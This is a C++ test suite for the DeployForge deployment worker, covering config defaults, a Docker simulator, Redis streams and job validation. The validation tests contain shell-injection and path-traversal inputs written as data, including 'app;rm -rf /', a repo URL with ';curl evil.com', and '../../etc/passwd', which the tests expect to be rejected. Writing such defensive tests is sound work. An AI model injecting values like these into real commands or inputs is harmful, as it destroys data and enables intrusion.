#include "../include/config.hpp"
#include "../include/logger.hpp"
#include "../include/process_runner.hpp"
#include "../include/docker_client.hpp"
#include "../include/redis_client.hpp"
#include "../include/worker.hpp"
#include <iostream>
#include <cassert>
#include <filesystem>
#include <nlohmann/json.hpp>

using namespace deployforge;

int g_passed = 0;
int g_total = 0;

#define TEST_ASSERT(cond, msg) \
    do { \
        g_total++; \
        if (!(cond)) { \
            std::cerr << "  ❌ FAILED: " << msg << " (" << __FILE__ << ":" << __LINE__ << ")" << std::endl; \
            exit(1); \
        } else { \
            g_passed++; \
            std::cout << "  ✓ " << msg << std::endl; \
        } \
    } while (0)

void testConfig() {
    std::cout << "\n[Suite 1] Config Loading" << std::endl;
    Config cfg;
    TEST_ASSERT(cfg.redis_host == "127.0.0.1", "Default Redis host is 127.0.0.1");
    TEST_ASSERT(cfg.redis_port == 6379, "Default Redis port is 6379");
    TEST_ASSERT(cfg.redis_stream == "stream:deployments", "Default stream is stream:deployments");
    TEST_ASSERT(cfg.redis_group == "deployforge_workers", "Default group is deployforge_workers");
}

void testProcessRunner() {
    std::cout << "\n[Suite 2] Process Runner & Path Traversal Defense" << std::endl;
    TEST_ASSERT(ProcessRunner::isValidDeploymentId("123e4567-e89b-12d3-a456-426614174000"), "UUID deploymentId is valid");
    TEST_ASSERT(ProcessRunner::isValidDeploymentId("dep_123_abc"), "Alphanumeric deploymentId is valid");

    TEST_ASSERT(!ProcessRunner::isValidDeploymentId("../etc/passwd"), "Path traversal rejected");
    TEST_ASSERT(!ProcessRunner::isValidDeploymentId("dep/123"), "Slash rejected");
    TEST_ASSERT(!ProcessRunner::isValidDeploymentId(""), "Empty ID rejected");

    std::string testDepId = "test-cpp-ws-001";
    std::string ws = ProcessRunner::getWorkspacePath("/tmp/df_test_ws", testDepId);
    TEST_ASSERT(std::filesystem::exists(ws), "Workspace directory created");
    TEST_ASSERT(ws.find(testDepId) != std::string::npos, "Workspace path contains deployment ID");

    auto cmdRes = ProcessRunner::executeCommand("echo", {"hello", "deployforge"});
    TEST_ASSERT(cmdRes.success(), "Subprocess executed successfully");
    TEST_ASSERT(cmdRes.output.find("hello deployforge") != std::string::npos, "Subprocess captured stdout");

    bool cleaned = ProcessRunner::cleanupWorkspace(ws);
    TEST_ASSERT(cleaned, "Workspace directory cleaned up");
    TEST_ASSERT(!std::filesystem::exists(ws), "Workspace path deleted");
}

void testDockerClientSimulator() {
    std::cout << "\n[Suite 3] Docker Client Simulator" << std::endl;
    DockerClient docker("/var/run/docker.sock", "simulator");
    TEST_ASSERT(docker.ping(), "Docker ping returns true in simulator");

    // Test image name validation
    TEST_ASSERT(DockerClient::isValidImageName("df-test-img:latest"), "Valid image name accepted");
    TEST_ASSERT(DockerClient::isValidImageName("my-app:1.0"), "Image with numbers and dots accepted");
    TEST_ASSERT(!DockerClient::isValidImageName("bad;name"), "Image name with semicolon rejected");
    TEST_ASSERT(!DockerClient::isValidImageName("Uppercase:1.0"), "Image name with uppercase rejected");
    TEST_ASSERT(!DockerClient::isValidImageName(""), "Empty image name rejected");

    bool buildThrew = false;
    try {
        docker.buildImage("/tmp", "bad;name:latest");
    } catch (const std::invalid_argument&) {
        buildThrew = true;
    }
    TEST_ASSERT(buildThrew, "buildImage throws invalid_argument on invalid image name");

    // Test HTTP response parsing
    auto [code200, b200] = DockerClient::parseHttpResponse("HTTP/1.1 200 OK\r\nContent-Length: 15\r\n\r\n{\"status\":\"ok\"}");
    TEST_ASSERT(code200 == 200 && b200 == "{\"status\":\"ok\"}", "parseHttpResponse parses 200 OK");

    auto [code204, b204] = DockerClient::parseHttpResponse("HTTP/1.1 204 No Content\r\n\r\n");
    TEST_ASSERT(code204 == 204 && b204.empty(), "parseHttpResponse parses 204 No Content");

    auto [codeChunked, bChunked] = DockerClient::parseHttpResponse("HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nWiki\r\n5\r\npedia\r\n0\r\n\r\n");
    TEST_ASSERT(codeChunked == 200 && bChunked == "Wikipedia", "parseHttpResponse decodes chunked transfer encoding");

    auto [code400, b400] = DockerClient::parseHttpResponse("HTTP/1.1 400 Bad Request\r\nContent-Length: 26\r\n\r\n{\"message\":\"bad parameter\"}");
    TEST_ASSERT(code400 == 400 && b400.find("bad parameter") != std::string::npos, "parseHttpResponse parses 400 Bad Request");

    auto [code500, b500] = DockerClient::parseHttpResponse("HTTP/1.1 500 Internal Server Error\r\nContent-Length: 28\r\n\r\n{\"message\":\"container crash\"}");
    TEST_ASSERT(code500 == 500 && b500.find("container crash") != std::string::npos, "parseHttpResponse parses 500 Internal Server Error");

    std::string img = docker.buildImage("/tmp", "df-test-img:latest");
    TEST_ASSERT(!img.empty(), "Image built in simulator");

    CreateContainerParams params;
    params.image_name = img;
    params.container_name = "df-test-container";
    params.container_port = 3000;
    params.limits.memory_mb = 512;
    params.limits.cpu_shares = 256;
    params.limits.pids_limit = 100;

    std::string cid = docker.createContainer(params);
    TEST_ASSERT(cid.rfind("sim_c_", 0) == 0, "Container ID formatted properly in simulator");

    TEST_ASSERT(docker.startContainer(cid), "Container started");
    TEST_ASSERT(!docker.startContainer("fail_sim_container"), "startContainer returns false on failure");

    auto info = docker.inspectContainer(cid);
    TEST_ASSERT(info.running, "Container inspect reports running");
    TEST_ASSERT(info.ip_address == "172.20.0.42", "Container IP assigned");

    TEST_ASSERT(docker.stopContainer(cid), "Container stopped");
    TEST_ASSERT(docker.removeContainer(cid), "Container removed");
}

void testRedisClient() {
    std::cout << "\n[Suite 4] Redis Streams & Hot State Operations" << std::endl;
    RedisClient redis("127.0.0.1", 6379);

    if (!redis.connect()) {
        std::cout << "  ⚠️ Redis server not reachable on 127.0.0.1:6379, skipping live Redis test" << std::endl;
        return;
    }
    TEST_ASSERT(redis.isConnected(), "Connected to Redis server");

    bool groupOk = redis.ensureConsumerGroup("stream:test_cpp_deployments", "cpp_workers");
    TEST_ASSERT(groupOk, "Consumer group ensured on Redis stream");

    std::string testDepId = "dep-cpp-test-999";
    bool hotOk = redis.setHotState(
        testDepId, "proj-123", "RUNNING", "running", 100,
        "c_test_cid_123", 3000, "cpp-test.deployforge.app", "https://cpp-test.deployforge.app"
    );
    TEST_ASSERT(hotOk, "Deployment hot state written via HSET");

    bool evOk = redis.publishEvent(
        "stream:test_cpp_events", "DEPLOYMENT_COMPLETED",
        testDepId, "proj-123", "usr-123", "RUNNING", "running", "c_test_cid_123", "", 15
    );
    TEST_ASSERT(evOk, "Deployment event published to stream via XADD");

    // Verify envelope and payload contract
    auto* reply = static_cast<redisReply*>(
        redisCommand(redis.getContext(), "XREVRANGE stream:test_cpp_events + - COUNT 1")
    );
    std::string eventType, aggregateId, payloadStr, createdAt;
    if (reply && reply->type == REDIS_REPLY_ARRAY && reply->elements > 0) {
        auto* msg = reply->element[0];
        if (msg->type == REDIS_REPLY_ARRAY && msg->elements >= 2) {
            auto* fields = msg->element[1];
            if (fields->type == REDIS_REPLY_ARRAY) {
                for (size_t i = 0; i + 1 < fields->elements; i += 2) {
                    std::string key = fields->element[i]->str ? fields->element[i]->str : "";
                    std::string val = fields->element[i + 1]->str ? fields->element[i + 1]->str : "";
                    if (key == "event_type") eventType = val;
                    else if (key == "aggregate_id") aggregateId = val;
                    else if (key == "payload") payloadStr = val;
                    else if (key == "created_at") createdAt = val;
                }
            }
        }
        freeReplyObject(reply);
    }

    TEST_ASSERT(eventType == "DEPLOYMENT_COMPLETED", "Event envelope has event_type DEPLOYMENT_COMPLETED");
    TEST_ASSERT(aggregateId == testDepId, "Event envelope has aggregate_id matching deployment ID");
    TEST_ASSERT(!createdAt.empty(), "Event envelope has created_at timestamp");
    TEST_ASSERT(!payloadStr.empty(), "Event envelope contains payload JSON string");

    nlohmann::json parsedPayload = nlohmann::json::parse(payloadStr);
    TEST_ASSERT(parsedPayload["deployment_id"] == testDepId, "Payload JSON contains matching deployment_id");
    TEST_ASSERT(parsedPayload["project_id"] == "proj-123", "Payload JSON contains matching project_id");
    TEST_ASSERT(parsedPayload["user_id"] == "usr-123", "Payload JSON contains matching user_id");
    TEST_ASSERT(parsedPayload["status"] == "RUNNING", "Payload JSON contains status RUNNING");
    TEST_ASSERT(parsedPayload["container_id"] == "c_test_cid_123", "Payload JSON contains container_id");
    TEST_ASSERT(parsedPayload["duration_seconds"] == 15, "Payload JSON contains duration_seconds");
}

void testWorkerLifecycle() {
    std::cout << "\n[Suite 5] End-to-End Worker Single Job Execution" << std::endl;
    Config cfg;
    cfg.docker_mode = "simulator";
    cfg.workspace_base_path = "/tmp/df_test_workspaces";
    cfg.redis_stream = "stream:test_cpp_deployments";
    cfg.redis_events_stream = "stream:test_cpp_events";
    cfg.redis_group = "cpp_workers";

    WorkerDaemon worker(cfg);
    if (!worker.init()) {
        std::cout << "  ⚠️ Worker init failed (Redis might be offline), skipping job test" << std::endl;
        return;
    }

    DeploymentJob job;
    job.message_id = "test-msg-001";
    job.deployment_id = "11111111-1111-1111-1111-111111111111";
    job.project_id = "22222222-2222-2222-2222-222222222222";
    job.user_id = "33333333-3333-3333-3333-333333333333";
    job.repo_url = "https://github.com/deployforge/sample-node";
    job.branch = "main";
    job.commit_hash = "abcdef123456";
    job.runtime = "node";
    job.port = 3000;
    job.domain = "cpp-test.deployforge.app";
    job.project_name = "cpp-sample-app";

    bool success = worker.processSingleJob(job);
    TEST_ASSERT(success, "Worker processed job through CLONING -> BUILDING -> STARTING -> RUNNING");
}

void testJobValidationAndStartFailure() {
    std::cout << "\n[Suite 6] S-07 Job Validation & Container Start Resilience" << std::endl;
    std::string errReason;

    DeploymentJob validJob;
    validJob.message_id = "msg-valid-001";
    validJob.deployment_id = "11111111-1111-1111-1111-111111111111";
    validJob.project_id = "22222222-2222-2222-2222-222222222222";
    validJob.user_id = "33333333-3333-3333-3333-333333333333";
    validJob.project_name = "valid-slug";
    validJob.port = 3000;
    validJob.repo_url = "https://github.com/deployforge/sample-node";
    validJob.branch = "main";
    TEST_ASSERT(WorkerDaemon::validateJob(validJob, errReason), "Valid job passes validation");

    // Hostile project name (S-07 injection attempt)
    DeploymentJob hostileProject = validJob;
    hostileProject.project_name = "app;rm -rf /";
    TEST_ASSERT(!WorkerDaemon::validateJob(hostileProject, errReason), "Hostile project_name with shell injection rejected");
    TEST_ASSERT(errReason.find("project_name") != std::string::npos, "Error specifies project_name");

    // Hostile repository URL
    DeploymentJob hostileRepo = validJob;
    hostileRepo.repo_url = "https://github.com/foo/bar;curl evil.com";
    TEST_ASSERT(!WorkerDaemon::validateJob(hostileRepo, errReason), "Hostile repository_url with shell injection rejected");
    TEST_ASSERT(errReason.find("repository_url") != std::string::npos, "Error specifies repository_url");

    // Hostile branch
    DeploymentJob hostileBranch = validJob;
    hostileBranch.branch = "main;whoami";
    TEST_ASSERT(!WorkerDaemon::validateJob(hostileBranch, errReason), "Hostile branch with shell injection rejected");

    // Path traversal in deployment ID
    DeploymentJob badDepId = validJob;
    badDepId.deployment_id = "../../etc/passwd";
    TEST_ASSERT(!WorkerDaemon::validateJob(badDepId, errReason), "Path traversal deployment_id rejected by UUID check");

    // Invalid port
    DeploymentJob badPort = validJob;
    badPort.port = 70000;
    TEST_ASSERT(!WorkerDaemon::validateJob(badPort, errReason), "Out-of-range port rejected");

    // Non-HTTP URL
    DeploymentJob badScheme = validJob;
    badScheme.repo_url = "file:///etc/passwd";
    TEST_ASSERT(!WorkerDaemon::validateJob(badScheme, errReason), "Non-HTTP repository_url rejected");

    // Test processSingleJob rejects hostile job immediately without spawning
    Config cfg;
    cfg.docker_mode = "simulator";
    cfg.workspace_base_path = "/tmp/df_test_workspaces";
    cfg.redis_stream = "stream:test_cpp_deployments";
    cfg.redis_events_stream = "stream:test_cpp_events";
    cfg.redis_group = "cpp_workers";

    WorkerDaemon worker(cfg);
    if (!worker.init()) {
        std::cout << "  ⚠️ Worker init failed (Redis might be offline), skipping job test" << std::endl;
        return;
    }

    bool hostileResult = worker.processSingleJob(hostileProject);
    TEST_ASSERT(!hostileResult, "processSingleJob returns false on hostile job validation failure");

    // Test startContainer failure triggers DEPLOYMENT_FAILED
    DeploymentJob startFailJob = validJob;
    startFailJob.message_id = "msg-fail-002";
    startFailJob.deployment_id = "44444444-4444-4444-4444-444444444444";
    startFailJob.project_name = "fail-app"; // triggers containerName with "fail" in simulator
    bool failResult = worker.processSingleJob(startFailJob);
    TEST_ASSERT(!failResult, "processSingleJob fails cleanly when container start fails");
}

int main() {
    std::cout << "==================================================" << std::endl;
    std::cout << "  DeployForge C++ Worker Engine Test Suite       " << std::endl;
    std::cout << "==================================================" << std::endl;

    testConfig();
    testProcessRunner();
    testDockerClientSimulator();
    testRedisClient();
    testWorkerLifecycle();
    testJobValidationAndStartFailure();

    std::cout << "\n==================================================" << std::endl;
    std::cout << "  All C++ Worker tests passed! (" << g_passed << "/" << g_total << ")" << std::endl;
    std::cout << "==================================================" << std::endl;

    return 0;
}
